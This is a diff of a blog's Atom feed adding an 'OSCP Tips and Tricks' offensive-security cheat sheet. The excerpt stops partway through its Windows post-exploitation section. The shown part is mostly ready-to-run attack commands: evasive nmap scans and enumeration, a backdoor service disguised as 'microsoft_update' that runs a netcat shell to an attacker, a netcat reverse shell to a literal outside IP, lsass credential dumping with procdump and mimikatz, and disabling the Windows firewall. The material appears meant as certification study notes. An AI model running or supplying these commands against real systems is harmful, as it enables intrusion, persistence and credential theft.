@@ -5,13 +5,672 @@
 <link rel="self" type="application/atom+xml" href="https://jivoi.github.io/feed.xml" />
 <link rel="alternate" type="text/html" href="https://jivoi.github.io" />
 <icon>https://i.imgur.com/s7cqI3w.jpg</icon>
-<updated>2015-06-30T12:27:37+03:00</updated>
+<updated>2015-06-30T17:53:41+03:00</updated>
 <id>https://jivoi.github.io/</id>
 <author>
   <name>EK</name>
   <uri>https://jivoi.github.io/</uri>
   <email>ekoz@protonmail.com</email>
 </author>
+
+
+<entry>
+  <title type="html"><![CDATA[OSCP Tips and Tricks]]></title>
+  <link rel="alternate" type="text/html" href="https://jivoi.github.io/2015/07/01/oscp-tips-and-tricks/" />
+  <id>https://jivoi.github.io/2015/07/01/oscp-tips-and-tricks</id>
+  <updated>2015-07-01 10:03:31 +0300T00:00:00-00:00</updated>
+  <published>2015-07-01T00:00:00+03:00</published>
+  
+  <author>
+    <name>EK</name>
+    <uri>https://jivoi.github.io</uri>
+    <email>ekoz@protonmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;OSCP (Offensive Security Certified Professional) Handy Tips and Tricks.&lt;/p&gt;
+
+&lt;section id=&quot;table-of-contents&quot; class=&quot;toc&quot;&gt;
+&lt;header&gt;
+&lt;h3&gt;Contents&lt;/h3&gt;
+&lt;/header&gt;
+&lt;div id=&quot;drawer&quot;&gt;
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap-full-web-vulnerable-scan&quot; id=&quot;markdown-toc-nmap-full-web-vulnerable-scan&quot;&gt;Nmap Full Web Vulnerable Scan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#dirb-dir-bruteforce&quot; id=&quot;markdown-toc-dirb-dir-bruteforce&quot;&gt;Dirb Dir Bruteforce:&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nikto-web-server-scanner&quot; id=&quot;markdown-toc-nikto-web-server-scanner&quot;&gt;Nikto web server scanner&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#wordpress-scanner&quot; id=&quot;markdown-toc-wordpress-scanner&quot;&gt;WordPress Scanner&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#http-fingerprinting&quot; id=&quot;markdown-toc-http-fingerprinting&quot;&gt;HTTP Fingerprinting&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#skip-fish-scanner&quot; id=&quot;markdown-toc-skip-fish-scanner&quot;&gt;SKIP Fish Scanner&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap-ports-scan&quot; id=&quot;markdown-toc-nmap-ports-scan&quot;&gt;Nmap Ports Scan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nc-scanning&quot; id=&quot;markdown-toc-nc-scanning&quot;&gt;NC Scanning&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#unicornscan&quot; id=&quot;markdown-toc-unicornscan&quot;&gt;Unicornscan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#xprobe2-os-fingerprinting&quot; id=&quot;markdown-toc-xprobe2-os-fingerprinting&quot;&gt;Xprobe2 OS fingerprinting&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#samba-enumeration&quot; id=&quot;markdown-toc-samba-enumeration&quot;&gt;Samba Enumeration&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#snmp-enumeration&quot; id=&quot;markdown-toc-snmp-enumeration&quot;&gt;SNMP Enumeration&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#windows-useful-cmds&quot; id=&quot;markdown-toc-windows-useful-cmds&quot;&gt;Windows Useful cmds&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#putty-link-tunnel&quot; id=&quot;markdown-toc-putty-link-tunnel&quot;&gt;PuTTY Link tunnel&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#enable-rdp-access&quot; id=&quot;markdown-toc-enable-rdp-access&quot;&gt;Enable RDP Access&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#turn-off-windows-firewall&quot; id=&quot;markdown-toc-turn-off-windows-firewall&quot;&gt;Turn Off Windows Firewall&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#meterpreter-vnc&quot; id=&quot;markdown-toc-meterpreter-vnc&quot;&gt;Meterpreter VNC&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#add-new-user-in-windows&quot; id=&quot;markdown-toc-add-new-user-in-windows&quot;&gt;Add New user in Windows&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#mimikatz-use&quot; id=&quot;markdown-toc-mimikatz-use&quot;&gt;Mimikatz use&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#passing-the-hash&quot; id=&quot;markdown-toc-passing-the-hash&quot;&gt;Passing the Hash&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#hashcat-password-cracking&quot; id=&quot;markdown-toc-hashcat-password-cracking&quot;&gt;Hashcat password cracking&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#netcat-examples&quot; id=&quot;markdown-toc-netcat-examples&quot;&gt;Netcat examples&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#banner-grabbing-with-nc&quot; id=&quot;markdown-toc-banner-grabbing-with-nc&quot;&gt;Banner grabbing with NC&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#window-reverse-shell&quot; id=&quot;markdown-toc-window-reverse-shell&quot;&gt;Window reverse shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#find-suidsgid-root-files&quot; id=&quot;markdown-toc-find-suidsgid-root-files&quot;&gt;Find SUID\SGID root files&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#python-shell&quot; id=&quot;markdown-toc-python-shell&quot;&gt;Python shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#pythonrubyphp-http-server&quot; id=&quot;markdown-toc-pythonrubyphp-http-server&quot;&gt;Python\Ruby\PHP HTTP Server&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#get-pids-of-process&quot; id=&quot;markdown-toc-get-pids-of-process&quot;&gt;Get PIDs of process&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#hydra-rdp-bruteforce&quot; id=&quot;markdown-toc-hydra-rdp-bruteforce&quot;&gt;Hydra rdp Bruteforce&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#mount-remote-windows-share&quot; id=&quot;markdown-toc-mount-remote-windows-share&quot;&gt;Mount Remote Windows Share&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#compiling-exploit-in-kali&quot; id=&quot;markdown-toc-compiling-exploit-in-kali&quot;&gt;Compiling Exploit in Kali&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#compiling-windows-exploits-on-kali&quot; id=&quot;markdown-toc-compiling-windows-exploits-on-kali&quot;&gt;Compiling Windows Exploits on Kali&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#nasm-commands&quot; id=&quot;markdown-toc-nasm-commands&quot;&gt;NASM Commands&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssh-pivoting&quot; id=&quot;markdown-toc-ssh-pivoting&quot;&gt;SSH Pivoting&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssh-pivoting-from-one-network-to-another&quot; id=&quot;markdown-toc-ssh-pivoting-from-one-network-to-another&quot;&gt;SSH Pivoting from One Network to Another&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#pivoting-using-metasploit&quot; id=&quot;markdown-toc-pivoting-using-metasploit&quot;&gt;Pivoting Using metasploit&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#exploit-db-search-using-csv-file&quot; id=&quot;markdown-toc-exploit-db-search-using-csv-file&quot;&gt;Exploit-DB search using CSV File&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-payloads&quot; id=&quot;markdown-toc-msf-payloads&quot;&gt;MSF Payloads&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-linux-reverse-meterpreter-binary&quot; id=&quot;markdown-toc-msf-linux-reverse-meterpreter-binary&quot;&gt;MSF Linux Reverse Meterpreter Binary&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-reverse-shell-c-shellcode&quot; id=&quot;markdown-toc-msf-reverse-shell-c-shellcode&quot;&gt;MSF Reverse Shell (C Shellcode)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-reverse-shell-python-script&quot; id=&quot;markdown-toc-msf-reverse-shell-python-script&quot;&gt;MSF Reverse Shell Python Script&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-reverse-asp-shell&quot; id=&quot;markdown-toc-msf-reverse-asp-shell&quot;&gt;MSF Reverse ASP Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-reverse-bash-shell&quot; id=&quot;markdown-toc-msf-reverse-bash-shell&quot;&gt;MSF Reverse Bash Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-reverse-php-shell&quot; id=&quot;markdown-toc-msf-reverse-php-shell&quot;&gt;MSF Reverse PHP Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#msf-reverse-win-bin&quot; id=&quot;markdown-toc-msf-reverse-win-bin&quot;&gt;MSF Reverse Win Bin&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#linux-security-commands&quot; id=&quot;markdown-toc-linux-security-commands&quot;&gt;Linux Security Commands&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#win-buffer-overflow-exploit-commands&quot; id=&quot;markdown-toc-win-buffer-overflow-exploit-commands&quot;&gt;Win Buffer Overflow Exploit Commands&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#seh---structured-exception-handling&quot; id=&quot;markdown-toc-seh---structured-exception-handling&quot;&gt;SEH - Structured Exception Handling&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#rop-dep&quot; id=&quot;markdown-toc-rop-dep&quot;&gt;ROP (DEP)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#aslr---address-space-layout-randomization&quot; id=&quot;markdown-toc-aslr---address-space-layout-randomization&quot;&gt;ASLR - Address space layout randomization&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#egg-hunter-techniques&quot; id=&quot;markdown-toc-egg-hunter-techniques&quot;&gt;EGG Hunter techniques&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#gdb-debugger-commands&quot; id=&quot;markdown-toc-gdb-debugger-commands&quot;&gt;GDB Debugger Commands&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#bash-reverse-shell&quot; id=&quot;markdown-toc-bash-reverse-shell&quot;&gt;BASH Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#perl-reverse-shell&quot; id=&quot;markdown-toc-perl-reverse-shell&quot;&gt;PERL Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ruby-reverse-shell&quot; id=&quot;markdown-toc-ruby-reverse-shell&quot;&gt;RUBY Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#python-reverse-shell&quot; id=&quot;markdown-toc-python-reverse-shell&quot;&gt;PYTHON Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#php-reverse-shell&quot; id=&quot;markdown-toc-php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#java-reverse-shell&quot; id=&quot;markdown-toc-java-reverse-shell&quot;&gt;JAVA Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#netcat-reverse-shell&quot; id=&quot;markdown-toc-netcat-reverse-shell&quot;&gt;NETCAT Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#telnet-reverse-shell&quot; id=&quot;markdown-toc-telnet-reverse-shell&quot;&gt;TELNET Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#xterm-reverse-shell&quot; id=&quot;markdown-toc-xterm-reverse-shell&quot;&gt;XTERM Reverse Shell&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#xss-cheat-codes&quot; id=&quot;markdown-toc-xss-cheat-codes&quot;&gt;XSS Cheat Codes&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;/div&gt;
+&lt;/section&gt;
+&lt;!-- /#table-of-contents --&gt;
+
+&lt;h3 id=&quot;nmap-full-web-vulnerable-scan&quot;&gt;Nmap Full Web Vulnerable Scan&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/share/nmap/scripts/
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; tar xzf nmap_nse_vulscan-2.0.tar.gz
+nmap -sS -sV --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vulscan/vulscan.nse target
+nmap -sS -sV --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vulscan/vulscan.nse –script-args &lt;span class=&quot;nv&quot;&gt;vulscandb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;scipvuldb.csv target
+nmap -sS -sV --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vulscan/vulscan.nse –script-args &lt;span class=&quot;nv&quot;&gt;vulscandb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;scipvuldb.csv -p80 target
+nmap -PN -sS -sV --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vulscan –script-args &lt;span class=&quot;nv&quot;&gt;vulscancorrelation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -p80 target
+nmap -sV --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vuln target
+nmap -PN -sS -sV --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;all –script-args &lt;span class=&quot;nv&quot;&gt;vulscancorrelation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dirb-dir-bruteforce&quot;&gt;Dirb Dir Bruteforce:&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;nikto-web-server-scanner&quot;&gt;Nikto web server scanner&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nikto -C all -h http://IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;wordpress-scanner&quot;&gt;WordPress Scanner&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/wpscanteam/wpscan.git &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wpscan
+./wpscan –url http://IP/ –enumerate p&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;http-fingerprinting&quot;&gt;HTTP Fingerprinting&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget http://www.net-square.com/_assets/httprint_linux_301.zip &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; unzip httprint_linux_301.zip
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;httprint_301/linux/
+./httprint -h http://IP -s signatures.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;skip-fish-scanner&quot;&gt;SKIP Fish Scanner&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;skipfish -m &lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;nmap-ports-scan&quot;&gt;Nmap Ports Scan&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;decoy- masqurade nmap -D RND:10 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;target&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Generates a random number of decoys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;decoy- masqurade nmap -D RND:10 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;target&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Generates a random number of decoys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;fargement
+3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;data packed – like orginal one not scan packet
+4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;use auxiliary/scanner/ip/ipidseq &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; find zombie ip in network to use them to scan — nmap -sI ip target
+5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;nmap –source-port &lt;span class=&quot;m&quot;&gt;53&lt;/span&gt; target
+nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;24&lt;/span&gt; –data-length&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1337&lt;/span&gt; -T2 target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; Randomize scan form diff IP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
+nmap –script smb-check-vulns.nse -p445 target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using NSE scripts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+nmap -sU -P0 -T Aggressive -p123 target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggresive Scan T1-T5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+nmap -sA -PN -sN target
+nmap -sS -sV -T5 -F -A -O target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;version detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+nmap -sU -v target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Udp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+nmap -sU -P0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Udp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+nmap -sC 192.168.31.10-12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;all scan default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;nc-scanning&quot;&gt;NC Scanning&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -v -w &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; target -z 1-1000
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; i in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;101..102&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; nc -vv -n -w &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 192.168.56.&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; 21-25 -z&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;unicornscan&quot;&gt;Unicornscan&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;us -H -msf -Iv 192.168.56.101 -p 1-65535
+us -H -mU -Iv 192.168.56.101 -p 1-65535
+
+-H resolve hostnames during the reporting phase
+-m scan mode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sf - tcp, U - udp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+-Iv - verbose&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;xprobe2-os-fingerprinting&quot;&gt;Xprobe2 OS fingerprinting&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;xprobe2 -v -p tcp:80:open IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;samba-enumeration&quot;&gt;Samba Enumeration&lt;/h2&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; target
+enum4linux target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;snmp-enumeration&quot;&gt;SNMP Enumeration&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;snmpget -v &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -c public IP 
+snmpwalk -v &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -c public IP
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;windows-useful-cmds&quot;&gt;Windows Useful cmds&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;start cmd.exe /k $cmd&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+sc create microsoft_update &lt;span class=&quot;nv&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&amp;quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; auto &lt;span class=&quot;nv&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ignore
+/c C:&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe -e c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;md.exe -vv 23.92.17.103 7779
+mimikatz.exe &lt;span class=&quot;s2&quot;&gt;&amp;quot;privilege::debug&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;log&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;sekurlsa::logonpasswords&amp;quot;&lt;/span&gt;
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe &lt;span class=&quot;s2&quot;&gt;&amp;quot;sekurlsa::minidump lsass.dmp&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;log&amp;quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;sekurlsa::logonpasswords&amp;quot;&lt;/span&gt;
+C:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;rocdump.exe -accepteula -ma lsass.exe lsass.dmp For &lt;span class=&quot;m&quot;&gt;32&lt;/span&gt; bits
+C:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;rocdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For &lt;span class=&quot;m&quot;&gt;64&lt;/span&gt; bits&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;putty-link-tunnel&quot;&gt;PuTTY Link tunnel&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Forward remote port to &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;address
+plink.exe -P &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; -l root -pw &lt;span class=&quot;s2&quot;&gt;&amp;quot;1234&amp;quot;&lt;/span&gt; -R 445:127.0.0.1:445 IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;enable-rdp-access&quot;&gt;Enable RDP Access&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reg add &lt;span class=&quot;s2&quot;&gt;&amp;quot;hklm\system\currentcontrolset\control\terminal server&amp;quot;&lt;/span&gt; /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;service remoteadmin &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt;
+netsh firewall &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;service remotedesktop &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;turn-off-windows-firewall&quot;&gt;Turn Off Windows Firewall&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;netsh firewall &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;opmode disable&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;meterpreter-vnc&quot;&gt;Meterpreter VNC&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;run getgui -u admin -p 1234
+run vnc -p 5043&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;add-new-user-in-windows&quot;&gt;Add New user in Windows&lt;/h3&gt;
+
